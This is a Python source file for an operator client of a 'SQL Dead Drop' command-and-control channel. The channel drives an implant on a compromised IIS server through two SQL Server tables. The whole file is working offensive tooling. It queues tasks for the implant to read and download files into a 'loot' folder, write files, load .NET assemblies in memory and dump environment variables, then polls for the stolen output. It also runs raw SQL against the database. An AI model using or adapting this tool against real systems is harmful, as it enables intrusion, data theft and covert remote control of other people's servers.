#!/usr/bin/env python3
"""

Author : Mr.Z @zux0x3a 
Site : 0xsp.com 
-----------------------
sql_c2_client.py — SQL Dead Drop C2 Client for IIS Trust Level Agent (T3)

Connects to a SQL Server database and uses two tables as a C2 dead drop
channel to interact with the IIS agent running under High/Medium Trust.

Schema (created by the agent on setup):
    __c2_tasks   (id, cmd, created, picked)
    __c2_results (id, task_id, output, created)

Workflow:
    1. Start agent: in phantom_v3_loader.aspx select T3, args: connstring|loop
    2. Run this client: python3 sql_c2_client.py -s SERVER -d DATABASE
    3. Type tasks at the prompt — they get inserted into __c2_tasks
    4. Client auto-polls __c2_results for output

Agent supports these managed tasks (no Process.Start / cmd.exe):
    sysinfo, ls [path], cat <file>, dl <file>, write path|data,
    asm <base64>, env, pwd, __EXIT__

Requirements:
    pip install pymssql
    (or: pip install pyodbc)

Usage:
    python3 sql_c2_client.py -s 10.10.10.50 -d tempdb
    python3 sql_c2_client.py -s 10.10.10.50 -d tempdb -u sa -p Password1
    python3 sql_c2_client.py --connstr "DRIVER={ODBC Driver 17 for SQL Server};SERVER=10.10.10.50;DATABASE=tempdb;Trusted_Connection=yes"
"""

import argparse
import sys
import os
import time
import threading
import base64
import readline
from datetime import datetime



DB_DRIVER = None

try:
    import pymssql
    DB_DRIVER = "pymssql"
except ImportError:
    pass

if DB_DRIVER is None:
    try:
        import pyodbc
        DB_DRIVER = "pyodbc"
    except ImportError:
        pass

if DB_DRIVER is None:
    print("[!] No SQL driver found. Install one:")
    print("    pip install pymssql")
    print("    pip install pyodbc")
    sys.exit(1)




class C:
    GREEN  = "\033[92m"
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"


def log(msg, color=C.DIM):
    ts = datetime.now().strftime("%H:%M:%S")
    sys.stdout.write(f"\r\033[K{color}[{ts}]{C.RESET} {msg}\n")
    sys.stdout.flush()


def separator():
    print(f"{C.DIM}{'─' * 72}{C.RESET}")




class Database:
    """Thin wrapper over pymssql or pyodbc."""

    def __init__(self, server, database, username=None, password=None, connstr=None):
        self.conn = None

        if connstr and DB_DRIVER == "pyodbc":
            log(f"Connecting via pyodbc (connection string)...", C.CYAN)
            self.conn = pyodbc.connect(connstr, autocommit=True)
        elif DB_DRIVER == "pymssql":
            log(f"Connecting via pymssql to {server}/{database}...", C.CYAN)
            if username and password:
                self.conn = pymssql.connect(server=server, user=username,
                                            password=password, database=database)
            else:
                # Windows auth (trusted)
                self.conn = pymssql.connect(server=server, database=database)
            self.conn.autocommit(True)
        elif DB_DRIVER == "pyodbc":
            log(f"Connecting via pyodbc to {server}/{database}...", C.CYAN)
            if username and password:
                cs = (f"DRIVER={{ODBC Driver 17 for SQL Server}};"
                      f"SERVER={server};DATABASE={database};"
                      f"UID={username};PWD={password}")
            else:
                cs = (f"DRIVER={{ODBC Driver 17 for SQL Server}};"
                      f"SERVER={server};DATABASE={database};"
                      f"Trusted_Connection=yes")
            self.conn = pyodbc.connect(cs, autocommit=True)

    def execute(self, sql, params=None):
        cur = self.conn.cursor()
        if params:
            cur.execute(sql, params)
        else:
            cur.execute(sql)
        return cur

    def scalar(self, sql, params=None):
        cur = self.execute(sql, params)
        row = cur.fetchone()
        cur.close()
        return row[0] if row else None

    def fetchall(self, sql, params=None):
        cur = self.execute(sql, params)
        rows = cur.fetchall()
        cols = [desc[0] for desc in cur.description] if cur.description else []
        cur.close()
        return cols, rows

    def close(self):
        if self.conn:
            self.conn.close()




seen_results = set()        # result IDs we've already displayed
result_log = []             # [{task_id, task_cmd, output, timestamp}]
poll_active = True
auto_poll = True




def poll_results(db):
    """Background thread that polls __c2_results for new entries."""
    global poll_active

    while poll_active:
        try:
            cols, rows = db.fetchall(
                "SELECT r.id, r.task_id, r.output, r.created, t.cmd "
                "FROM __c2_results r "
                "JOIN __c2_tasks t ON r.task_id = t.id "
                "ORDER BY r.id ASC"
            )

            for row in rows:
                rid = row[0]
                if rid in seen_results:
                    continue

                seen_results.add(rid)
                task_id = row[1]
                output  = row[2] or ""
                created = row[3]
                task_cmd = row[4] or "?"

                entry = {
                    "result_id": rid,
                    "task_id": task_id,
                    "task_cmd": task_cmd,
                    "output": output,
                    "timestamp": created,
                }
                result_log.append(entry)

                # Handle file downloads
                if output.startswith("FILE:"):
                    b64 = output[5:]
                    fname = f"download_{datetime.now().strftime('%Y%m%d_%H%M%S')}_task{task_id}.bin"
                    fpath = os.path.join("loot", fname)
                    os.makedirs("loot", exist_ok=True)
                    try:
                        raw = base64.b64decode(b64)
                        with open(fpath, "wb") as f:
                            f.write(raw)
                        log(f"[FILE]   Task #{task_id} [{C.CYAN}{task_cmd}{C.RESET}] "
                            f"→ {C.GREEN}{fpath}{C.RESET} ({len(raw)} bytes)", C.GREEN)
                    except Exception as e:
                        log(f"[FILE]   Task #{task_id}: decode error: {e}", C.RED)
                else:
                    log(f"[RESULT] Task #{task_id} [{C.CYAN}{task_cmd}{C.RESET}] "
                        f"({len(output)} bytes)", C.GREEN)
                    if auto_poll:
                        separator()
                        print(output)
                        separator()

        except Exception as e:
            # Connection may drop, table may not exist yet, etc.
            pass

        time.sleep(2)




BANNER = f"""
{C.BOLD}{C.RED}\
   ╔═╗╔═╗ ╦    ╔╦╗┌─┐┌─┐┌┬┐  ╔╦╗┬─┐┌─┐┌─┐
   ╚═╗║═╬╗║     ║║├┤ ├─┤ ││   ║║├┬┘│ │├─┘
   ╚═╝╚═╝╚╩═╝  ═╩╝└─┘┴ ┴─┴┘  ═╩╝┴└─└─┘┴\
{C.RESET}
{C.BOLD}   SQL Dead Drop C2 Client @zux0x3a {C.RESET}
{C.DIM}   For IIS High/Medium Trust (T3)
   Managed tasks via SQL Server tables{C.RESET}
"""

HELP_TEXT = f"""
{C.BOLD}═══════════════════════════════════════════════════════════════{C.RESET}
{C.BOLD} SQL Dead Drop C2 — Operator Client{C.RESET}
{C.BOLD}═══════════════════════════════════════════════════════════════{C.RESET}

{C.CYAN}Managed Tasks (sent to agent via SQL):{C.RESET}
  sysinfo                System info (machine, user, OS, CLR)
  ls [path]              Directory listing
  cat <file>             Read file contents
  dl <file>              Download file (saved to ./loot/)
  write <path>|<data>    Write file (plaintext or base64)
  asm <base64>           Load .NET assembly in-memory
  env                    Environment variables
  pwd                    Current working directory

{C.CYAN}Control:{C.RESET}
  kill                   Send __EXIT__ to terminate agent
  status                 Show task queue and pending results
  results / log          Show all results
  last [n]               Show last N results (default: 1)
  show <n>               Show result #n in full
  pending                Show tasks waiting for results
  flush                  Mark all tasks as picked (reset)
  cleanup                Drop C2 tables (destructive!)
  save <file>            Save all results to file
  autoprint [on|off]     Toggle auto-display of results
  sql <query>            Run raw SQL query
  help / ?               This help
  quit / q               Exit client

{C.YELLOW}NOTE: Agent executes managed .NET tasks only (no cmd.exe).
      Process.Start is blocked under High/Medium Trust.{C.RESET}
"""


def console_loop(db):
    global poll_active, auto_poll

    print(BANNER)

    # Check if tables exist
    try:
        count = db.scalar("SELECT COUNT(*) FROM __c2_tasks")
        log(f"Connected. __c2_tasks has {count} entries.", C.GREEN)
        rcount = db.scalar("SELECT COUNT(*) FROM __c2_results")
        log(f"__c2_results has {rcount} entries.", C.GREEN)
    except Exception:
        log("C2 tables not found. Run agent with 'setup' mode first.", C.YELLOW)
        log("Or the agent will create them on first connection.", C.YELLOW)

    print(HELP_TEXT)

    while True:
        try:
            prompt = f"{C.BOLD}{C.CYAN}SQL-C2{C.RESET}> "
            cmd = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not cmd:
            continue

        lower = cmd.lower()

        # ── Local commands ───────────────────────────────────────────
        if lower in ("quit", "q"):
            log("Exiting...", C.YELLOW)
            break

        elif lower in ("help", "?"):
            print(HELP_TEXT)

        elif lower == "status":
            try:
                total    = db.scalar("SELECT COUNT(*) FROM __c2_tasks") or 0
                picked   = db.scalar("SELECT COUNT(*) FROM __c2_tasks WHERE picked=1") or 0
                pending  = db.scalar("SELECT COUNT(*) FROM __c2_tasks WHERE picked=0") or 0
                results  = db.scalar("SELECT COUNT(*) FROM __c2_results") or 0
                print()
                print(f"  Tasks total:   {total}")
                print(f"  Tasks picked:  {picked}")
                print(f"  Tasks pending: {C.YELLOW}{pending}{C.RESET}")
                print(f"  Results:       {C.GREEN}{results}{C.RESET}")
                print(f"  Local seen:    {len(seen_results)}")
                print()
            except Exception as e:
                log(f"Error: {e}", C.RED)

        elif lower == "pending":
            try:
                cols, rows = db.fetchall(
                    "SELECT t.id, t.cmd, t.created "
                    "FROM __c2_tasks t "
                    "LEFT JOIN __c2_results r ON t.id = r.task_id "
                    "WHERE r.id IS NULL AND t.picked = 1 "
                    "ORDER BY t.id ASC"
                )
                if not rows:
                    log("No pending tasks (all have results or none dispatched).", C.DIM)
                else:
                    print()
                    print(f"  {C.BOLD}{'TaskID':<8} {'Command':<40} {'Created'}{C.RESET}")
                    print(f"  {'─'*65}")
                    for row in rows:
                        print(f"  {row[0]:<8} {str(row[1])[:38]:<40} {row[2]}")
                    print()
            except Exception as e:
                log(f"Error: {e}", C.RED)

        elif lower in ("results", "log"):
            if not result_log:
                log("No results yet. Waiting for agent...", C.YELLOW)
            else:
                print()
                print(f"  {C.BOLD}{'#':<5} {'Task':<6} {'Command':<30} {'Size':<10} {'Time'}{C.RESET}")
                print(f"  {'─'*70}")
                for i, entry in enumerate(result_log):
                    cmd_preview = entry['task_cmd'][:28]
                    print(f"  {i:<5} #{entry['task_id']:<4} {cmd_preview:<30} "
                          f"{len(entry['output']):<10} {entry['timestamp']}")
                print()
                print(f"  {C.DIM}Use 'show <#>' for full output, 'last [n]' for recent.{C.RESET}")
                print()

        elif lower.startswith("last"):
            parts = lower.split()
            n = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
            recent = result_log[-n:]
            if not recent:
                log("No results.", C.YELLOW)
            else:
                for entry in recent:
                    print()
                    print(f"  {C.BOLD}Task #{entry['task_id']} "
                          f"[{C.CYAN}{entry['task_cmd']}{C.RESET}{C.BOLD}] "
                          f"{entry['timestamp']}{C.RESET}")
                    separator()
                    print(entry["output"])
                    separator()

        elif lower.startswith("show "):
            parts = lower.split()
            if len(parts) > 1 and parts[1].isdigit():
                idx = int(parts[1])
                if 0 <= idx < len(result_log):
                    entry = result_log[idx]
                    print()
                    print(f"  {C.BOLD}Result #{idx} — Task #{entry['task_id']} "
                          f"[{C.CYAN}{entry['task_cmd']}{C.RESET}{C.BOLD}] "
                          f"{entry['timestamp']}{C.RESET}")
                    separator()
                    print(entry["output"])
                    separator()
                else:
                    log(f"Invalid index. Range: 0-{len(result_log)-1}", C.RED)
            else:
                log("Usage: show <result-number>", C.YELLOW)

        elif lower.startswith("save "):
            fname = cmd[5:].strip()
            try:
                with open(fname, "w") as f:
                    for i, entry in enumerate(result_log):
                        f.write(f"{'='*60}\n")
                        f.write(f"Result #{i} | Task #{entry['task_id']} | "
                                f"Cmd: {entry['task_cmd']} | {entry['timestamp']}\n")
                        f.write(f"{'='*60}\n")
                        f.write(entry["output"])
                        f.write("\n\n")
                log(f"Saved {len(result_log)} results to {C.GREEN}{fname}{C.RESET}", C.GREEN)
            except Exception as e:
                log(f"Save error: {e}", C.RED)

        elif lower.startswith("autoprint"):
            parts = lower.split()
            if len(parts) > 1:
                auto_poll = parts[1] in ("on", "true", "1", "yes")
            else:
                auto_poll = not auto_poll
            log(f"Auto-print: {C.GREEN if auto_poll else C.RED}"
                f"{'ON' if auto_poll else 'OFF'}{C.RESET}", C.GREEN)

        elif lower == "flush":
            try:
                db.execute("UPDATE __c2_tasks SET picked=0")
                log("All tasks reset to unpicked.", C.YELLOW)
            except Exception as e:
                log(f"Error: {e}", C.RED)

        elif lower == "cleanup":
            confirm = input(f"  {C.RED}Drop C2 tables? This is destructive. [y/N]: {C.RESET}").strip().lower()
            if confirm == "y":
                try:
                    db.execute("IF OBJECT_ID('__c2_results') IS NOT NULL DROP TABLE __c2_results")
                    db.execute("IF OBJECT_ID('__c2_tasks') IS NOT NULL DROP TABLE __c2_tasks")
                    log("C2 tables dropped.", C.GREEN)
                except Exception as e:
                    log(f"Error: {e}", C.RED)
            else:
                log("Cancelled.", C.DIM)

        elif lower.startswith("sql "):
            raw_sql = cmd[4:].strip()
            try:
                cols, rows = db.fetchall(raw_sql)
                if cols:
                    # Print as table
                    widths = [max(len(str(c)), max((len(str(r[i])) for r in rows), default=0))
                              for i, c in enumerate(cols)]
                    header = "  ".join(str(c).ljust(min(w, 50)) for c, w in zip(cols, widths))
                    print(f"\n  {C.BOLD}{header}{C.RESET}")
                    print(f"  {'─' * len(header)}")
                    for row in rows[:50]:
                        line = "  ".join(str(v)[:50].ljust(min(w, 50)) for v, w in zip(row, widths))
                        print(f"  {line}")
                    if len(rows) > 50:
                        print(f"  {C.DIM}... {len(rows)-50} more rows{C.RESET}")
                    print()
                else:
                    log("Query executed (no result set).", C.GREEN)
            except Exception as e:
                log(f"SQL error: {e}", C.RED)

      
        elif lower == "kill":
            try:
                db.execute("INSERT INTO __c2_tasks(cmd) VALUES('__EXIT__')")
                log("Kill signal (__EXIT__) sent to agent.", C.YELLOW)
            except Exception as e:
                log(f"Error: {e}", C.RED)

       
        elif lower in ("sysinfo", "info", "env", "pwd"):
            try:
                db.execute("INSERT INTO __c2_tasks(cmd) VALUES(%s)", (cmd,))
                tid = db.scalar("SELECT MAX(id) FROM __c2_tasks")
                log(f"[TASK #{tid}] {C.CYAN}{cmd}{C.RESET}", C.GREEN)
            except Exception as e:
                log(f"Error: {e}", C.RED)

        elif lower in ("ls", "dir"):
            task = f"{cmd} ."
            try:
                db.execute("INSERT INTO __c2_tasks(cmd) VALUES(%s)", (task,))
                tid = db.scalar("SELECT MAX(id) FROM __c2_tasks")
                log(f"[TASK #{tid}] {C.CYAN}{task}{C.RESET}", C.GREEN)
            except Exception as e:
                log(f"Error: {e}", C.RED)

        elif lower.startswith(("ls ", "dir ", "cat ", "read ", "dl ",
                               "download ", "write ", "upload ",
                               "asm ", "loadasm ")):
            try:
                db.execute("INSERT INTO __c2_tasks(cmd) VALUES(%s)", (cmd,))
                tid = db.scalar("SELECT MAX(id) FROM __c2_tasks")
                log(f"[TASK #{tid}] {C.CYAN}{cmd}{C.RESET}", C.GREEN)
            except Exception as e:
                log(f"Error: {e}", C.RED)

        else:
            # Send as raw task — agent will return error if unknown
            log(f"Sending as raw task to agent.", C.YELLOW)
            try:
                db.execute("INSERT INTO __c2_tasks(cmd) VALUES(%s)", (cmd,))
                tid = db.scalar("SELECT MAX(id) FROM __c2_tasks")
                log(f"[TASK #{tid}] {C.CYAN}{cmd}{C.RESET}", C.GREEN)
            except Exception as e:
                log(f"Error: {e}", C.RED)




def main():
    global poll_active

    parser = argparse.ArgumentParser(
        description="SQL Dead Drop C2 Client — for IIS Trust Level Agent (T3)")
    parser.add_argument("-s", "--server",
                        help="SQL Server hostname or IP")
    parser.add_argument("-d", "--database", default="tempdb",
                        help="Database name (default: tempdb)")
    parser.add_argument("-u", "--username",
                        help="SQL username (omit for Windows auth)")
    parser.add_argument("-p", "--password",
                        help="SQL password")
    parser.add_argument("--port", type=int, default=1433,
                        help="SQL Server port (default: 1433)")
    parser.add_argument("--connstr",
                        help="Full connection string (pyodbc only, overrides -s/-d/-u/-p)")
    args = parser.parse_args()

    if not args.server and not args.connstr:
        parser.error("Either --server or --connstr is required")

    server = args.server
    if args.port != 1433 and args.server:
        server = f"{args.server}:{args.port}"

    os.makedirs("loot", exist_ok=True)

    try:
        db = Database(
            server=server,
            database=args.database,
            username=args.username,
            password=args.password,
            connstr=args.connstr,
        )
        log(f"Connected to SQL Server ({DB_DRIVER})", C.GREEN)
    except Exception as e:
        log(f"Connection failed: {e}", C.RED)
        sys.exit(1)

    # Start background result poller
    poller = threading.Thread(target=poll_results, args=(db,), daemon=True)
    poller.start()
    log("Background result poller started (2s interval)", C.GREEN)

    try:
        console_loop(db)
    except Exception as e:
        log(f"Error: {e}", C.RED)
    finally:
        poll_active = False
        db.close()
        log("Disconnected.", C.YELLOW)


if __name__ == "__main__":
    main()
